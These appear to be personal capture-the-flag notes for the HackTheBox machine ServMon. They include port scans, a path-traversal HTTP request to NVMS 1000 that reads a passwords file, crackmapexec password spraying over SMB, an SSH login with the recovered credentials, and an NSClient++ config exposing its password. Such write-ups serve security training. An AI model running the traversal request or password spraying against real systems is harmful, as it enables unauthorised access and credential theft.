ServMon IP: 10.10.10.184


rustscan:


PORT      STATE SERVICE      REASON
21/tcp    open  ftp          syn-ack
22/tcp    open  ssh          syn-ack
80/tcp    open  http         syn-ack
135/tcp   open  msrpc        syn-ack
139/tcp   open  netbios-ssn  syn-ack
445/tcp   open  microsoft-ds syn-ack
5666/tcp  open  nrpe         syn-ack
6063/tcp  open  x11          syn-ack
6699/tcp  open  napster      syn-ack
8443/tcp  open  https-alt    syn-ack
49664/tcp open  unknown      syn-ack
49665/tcp open  unknown      syn-ack
49666/tcp open  unknown      syn-ack
49667/tcp open  unknown      syn-ack
49668/tcp open  unknown      syn-ack
49669/tcp open  unknown      syn-ack
49670/tcp open  unknown      syn-ack


nmap:

PORT      STATE SERVICE       REASON  VERSION
21/tcp    open  ftp           syn-ack Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_02-28-22  06:35PM       <DIR>          Users
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp    open  ssh           syn-ack OpenSSH for_Windows_8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 c7:1a:f6:81:ca:17:78:d0:27:db:cd:46:2a:09:2b:54 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLqFnd0LtYC3vPEYbWRZEOTBIpA++rGtx7C/R2/f2Nrro7eR3prZWUiZm0zoIEvjMl+ZFTe7UqziszU3tF8v8YeguZ5yGcWwkuJCCOROdiXt37INiwgFnRaiIGKg4hYzMcGrhQT/QVx53KZPNJHGuTl18yTlXFvQZjgPk1Bc/0JGw9C1Dx9abLs1zC03S4/sFepnECbfnTXzm28nNbd+VI3UUe5rjlnC4TrRLUMAtl8ybD2LA2919qGTT1HjUf8h73sGWdY9rrfMg4omua3ywkQOaoV/KWJZVQvChAYINM2D33wJJjngppp8aPgY/1RfVVXh/asAZJD49AhTU+1HSvBHO6K9/Bh6p0xWgVXhjuEd0KUyCwRqkvWAjxw5xrCCokjYcOEZ34fA+IkwPpK4oQE279/Y5p7niZyP4lFVl5cu0J9TfWUcavL44neyyNHNSJPOLSMHGgGs10GsfjqCdX0ggjhxc0RqWa9oZZtlVtsIV5WR6MyRsUPTV6N8NRDD8=
|   256 3e:63:ef:3b:6e:3e:4a:90:f3:4c:02:e9:40:67:2e:42 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA5iE0EIBy2ljOhQ42zqa843noU8K42IIHcRa9tFu5kUtlUcQ9CghqmRG7yrLjEBxJBMeZ3DRL3xEXH0K5rCRGY=
|   256 5a:48:c8:cd:39:78:21:29:ef:fb:ae:82:1d:03:ad:af (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN6c7yYxNJoV/1Lp8AQeOGoJrtQ6rgTitX0ksHDoKjhn
80/tcp    open  http          syn-ack
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   X11Probe: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
5666/tcp  open  tcpwrapped    syn-ack
6063/tcp  open  tcpwrapped    syn-ack
6699/tcp  open  napster?      syn-ack
8443/tcp  open  ssl/https-alt syn-ack
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|_    Location: /index.html
| http-methods: 
|_  Supported Methods: GET
| http-title: NSClient++
|_Requested resource was /index.html
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2020-01-14T13:24:20
| Not valid after:  2021-01-13T13:24:20
| MD5:   1d03 0c40 5b7a 0f6d d8c8 78e3 cba7 38b4
| SHA-1: 7083 bd82 b4b0 f9c0 cc9c 5019 2f9f 9291 4694 8334
| -----BEGIN CERTIFICATE-----
| MIICoTCCAYmgAwIBAgIBADANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAlsb2Nh
| bGhvc3QwHhcNMjAwMTE0MTMyNDIwWhcNMjEwMTEzMTMyNDIwWjAUMRIwEAYDVQQD
| DAlsb2NhbGhvc3QwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDXCoMi
| kUUWbCi0E1C/LfZFrm4UKCheesOFUAITOnrCvfkYmUR0o7v9wQ8yR5sQR8OIxfJN
| vOTE3C/YZjPE/XLFrLhBpb64X83rqzFRwX7bHVr+PZmHQR0qFRvrsWoQTKcjrElo
| R4WgF4AWkR8vQqsCADPuDGIsNb6PyXSru8/A/HJSt5ef8a3dcOCszlm2bP62qsa8
| XqumPHAKKwiu8k8N94qyXyVwOxbh1nPcATwede5z/KkpKBtpNfSFjrL+sLceQC5S
| wU8u06kPwgzrqTM4L8hyLbsgGcByOBeWLjPJOuR0L/a33yTL3lLFDx/RwGIln5s7
| BwX8AJUEl+6lRs1JAgMBAAEwDQYJKoZIhvcNAQEFBQADggEBAAjXGVBKBNUUVJ51
| b2f08SxINbWy4iDxomygRhT/auRNIypAT2muZ2//KBtUiUxaHZguCwUUzB/1jiED
| s/IDA6dWvImHWnOZGgIUsLo/242RsNgKUYYz8sxGeDKceh6F9RvyG3Sr0OyUrPHt
| sc2hPkgZ0jgf4igc6/3KLCffK5o85bLOQ4hCmJqI74aNenTMNnojk42NfBln2cvU
| vK13uXz0wU1PDgfyGrq8DL8A89zsmdW6QzBElnNKpqNdSj+5trHe7nYYM5m0rrAb
| H2nO4PdFbPGJpwRlH0BOm0kIY0az67VfOakdo1HiWXq5ZbhkRm27B2zO7/ZKfVIz
| XXrt6LA=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack Microsoft Windows RPC
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.91%I=7%D=2/7%Time=63E24E15%P=x86_64-pc-linux-gnu%r(GetRe
SF:quest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\nCont
SF:ent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n\xef
SF:\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\x
SF:20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-tran
SF:sitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/xhtml
SF:\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x20<sc
SF:ript\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x20wi
SF:ndow\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\x20<
SF:/script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(HTTPOptions
SF:,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\nContent-L
SF:ength:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n\xef\xbb\
SF:xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\x20Tra
SF:nsitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-transitio
SF:nal\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/xhtml\">\r
SF:\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x20<script\
SF:x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x20window\
SF:.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\x20</scri
SF:pt>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(RTSPRequest,1B4,
SF:"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\nContent-Length
SF::\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n\xef\xbb\xbf<!
SF:DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\x20Transiti
SF:onal//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-transitional\.
SF:dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/xhtml\">\r\n<he
SF:ad>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x20<script\x20ty
SF:pe=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x20window\.loca
SF:tion\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\x20</script>\r
SF:\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(X11Probe,6B,"HTTP/1\.
SF:1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/html\r\nContent
SF:-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8443-TCP:V=7.91%T=SSL%I=7%D=2/7%Time=63E24E1C%P=x86_64-pc-linux-gnu
SF:%r(GetRequest,74,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocation:
SF:\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
SF:0\0\0\0\0\0\0s\0d\0a\0y\0:\0T\0h\0u\0:\0T\0h\0u\0r\0s\0")%r(HTTPOptions
SF:,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x
SF:20found")%r(FourOhFourRequest,36,"HTTP/1\.1\x20404\r\nContent-Length:\x
SF:2018\r\n\r\nDocument\x20not\x20found")%r(RTSPRequest,36,"HTTP/1\.1\x204
SF:04\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found")%r(SIPOpti
SF:ons,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20no
SF:t\x20found");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 32848/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 20065/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 35375/udp): CLEAN (Failed to receive data)
|   Check 4 (port 62863/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-02-07T13:13:39
|_  start_date: N/A

ftp:

125 Data connection already open; Transfer starting.
02-28-22  06:36PM       <DIR>          Nadine
02-28-22  06:37PM       <DIR>          Nathan

there is a txt file in each folder. This 2 can be real users on the machine.

      
┌──(kali㉿kali)-[~/Practice/HackTheBox/Servmon]
└─$ cat Notes\ to\ do.txt 
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint                                                                                                                                                                                                     
                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Practice/HackTheBox/Servmon]
└─$ cat Confidential.txt 
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine                                                                                                                                                                                                     



so, what we know: there is a Passwords.txt file on Nadine's desktop. Let's see if we can use path traversal to read the content of that file


GET /../../../../../../../../../../users/nathan/desktop/passwords.txt HTTP/1.1
Host: 10.10.10.184
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.184/
Connection: close
Cookie: dataPort=6063
Upgrade-Insecure-Requests: 1


HTTP/1.1 200 OK
Content-type: text/plain
Content-Length: 156
Connection: close
AuthInfo: 

1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$






Exploring the site on port 80, we find NVMS 1000

┌──(kali㉿kali)-[~]
└─$ searchsploit nvms                 
------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                     |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
NVMS 1000 - Directory Traversal                                                                                                                                    | hardware/webapps/47774.txt
OpenVms 5.3/6.2/7.x - UCX POP Server Arbitrary File Modification                                                                                                   | multiple/local/21856.txt
OpenVms 8.3 Finger Service - Stack Buffer Overflow                                                                                                                 | multiple/dos/32193.txt
TVT NVMS 1000 - Directory Traversal                                                                                                                                | hardware/webapps/48311.py
------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
                                                                                                                                                                                                     
┌──(kali㉿kali)-[~]
└─$ cd Practice/HackTheBox/Servmon 
                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Practice/HackTheBox/Servmon]
└─$ searchsploit -m  hardware/webapps/47774.txt
  Exploit: NVMS 1000 - Directory Traversal
      URL: https://www.exploit-db.com/exploits/47774
     Path: /usr/share/exploitdb/exploits/hardware/webapps/47774.txt
File Type: UTF-8 Unicode text

Copied to: /home/kali/Practice/HackTheBox/Servmon/47774.txt



we can use crackmapexec in order to see if there is a match in passwords and users. First, create a new file that contains the passwords , and then create a second file that contains the users: administrator,nadine,nathan

      
┌──(kali㉿kali)-[~/Practice/HackTheBox/Servmon]
└─$ crackmapexec smb 10.10.10.184 -u users.txt -p passwords.txt 
SMB         10.10.10.184    445    SERVMON          [*] Windows 10.0 Build 17763 x64 (name:SERVMON) (domain:ServMon) (signing:False) (SMBv1:False)
SMB         10.10.10.184    445    SERVMON          [-] ServMon\administrator:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] ServMon\administrator:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] ServMon\administrator:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] ServMon\administrator:L1k3B1gBut7s@W0rk STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] ServMon\administrator:0nly7h3y0unGWi11F0l10w STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] ServMon\administrator:IfH3s4b0Utg0t0H1sH0me STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] ServMon\administrator:Gr4etN3w5w17hMySk1Pa5$ STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] ServMon\administrator: STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] ServMon\nathan:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] ServMon\nathan:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] ServMon\nathan:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] ServMon\nathan:L1k3B1gBut7s@W0rk STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] ServMon\nathan:0nly7h3y0unGWi11F0l10w STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] ServMon\nathan:IfH3s4b0Utg0t0H1sH0me STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] ServMon\nathan:Gr4etN3w5w17hMySk1Pa5$ STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] ServMon\nathan: STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] ServMon\nadine:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] ServMon\nadine:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] ServMon\nadine:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [+] ServMon\nadine:L1k3B1gBut7s@W0rk 


we got a match: nadine:L1k3B1gBut7s@W0rk

we can use ssh to log in to he machine:

ssh nadine@10.10.10.184

Microsoft Windows [Version 10.0.17763.864]           
(c) 2018 Microsoft Corporation. All rights reserved. 
                                                     
nadine@SERVMON C:\Users\Nadine>                      

user flag: ba877e9212e2b70a189339bd51bad065

PRIVESC:

nadine@SERVMON C:\Users\Nadine\Desktop>whoami/priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled



https://10.10.10.184:8443/index.html#/



nsclient.ini stores the password of nsclient


nadine@SERVMON C:\Program Files\NSClient++>type nsclient.ini 
ï»¿# If you want to fill this file with all available options run the following command: 
#   nscp settings --generate --add-defaults --load-all
# If you want to activate a module and bring in all its options use:
#   nscp settings --activate-module <MODULE NAME> --add-defaults
# For details run: nscp settings --help


; in flight - TODO
[/settings/default]

; Undocumented key
password = ew2x6SsGTxjRwXOT

; Undocumented key
allowed hosts = 127.0.0.1


; in flight - TODO
[/settings/NRPE/server]

; Undocumented key
ssl options = no-sslv2,no-sslv3

; Undocumented key
verify mode = peer-cert

; Undocumented key
insecure = false


; in flight - TODO
[/modules]

; Undocumented key
CheckHelpers = disabled

; Undocumented key 
CheckEventLog = disabled

; Undocumented key
CheckNSCP = disabled

; Undocumented key
CheckDisk = disabled

; Undocumented key
CheckSystem = disabled

; Undocumented key
WEBServer = enabled

; Undocumented key
NRPEServer = enabled

; CheckTaskSched - Check status of your scheduled jobs.
CheckTaskSched = enabled

; Scheduler - Use this to schedule check commands and jobs in conjunction with for instance passive monitoring through NSCA
Scheduler = enabled

; CheckExternalScripts - Module used to execute external scripts
CheckExternalScripts = enabled


; Script wrappings - A list of templates for defining script commands. Enter any command line here and they will be expanded by scripts placed under the wrapped scripts section. %SCRIPT% will be re
placed by the actual script an %ARGS% will be replaced by any given arguments.
[/settings/external scripts/wrappings]

; Batch file - Command used for executing wrapped batch files
bat = scripts\\%SCRIPT% %ARGS%

; Visual basic script - Command line used for wrapped vbs scripts
vbs = cscript.exe //T:30 //NoLogo scripts\\lib\\wrapper.vbs %SCRIPT% %ARGS%

; POWERSHELL WRAPPING - Command line used for executing wrapped ps1 (powershell) scripts 
ps1 = cmd /c echo If (-Not (Test-Path "scripts\%SCRIPT%") ) { Write-Host "UNKNOWN: Script `"%SCRIPT%`" not found."; exit(3) }; scripts\%SCRIPT% $ARGS$; exit($lastexitcode) | powershell.exe /noprofi
le -command -


; External scripts - A list of scripts available to run from the CheckExternalScripts module. Syntax is: `command=script arguments`
[/settings/external scripts/scripts]


; Schedules - Section for the Scheduler module.
[/settings/scheduler/schedules]

; Undocumented key
foobar = command = foobar


; External script settings - General settings for the external scripts module (CheckExternalScripts).
[/settings/external scripts]
allow arguments = true


Privesc works with this solution:
https://elc4br4.github.io/htb/hackthebox-servmon-writeup


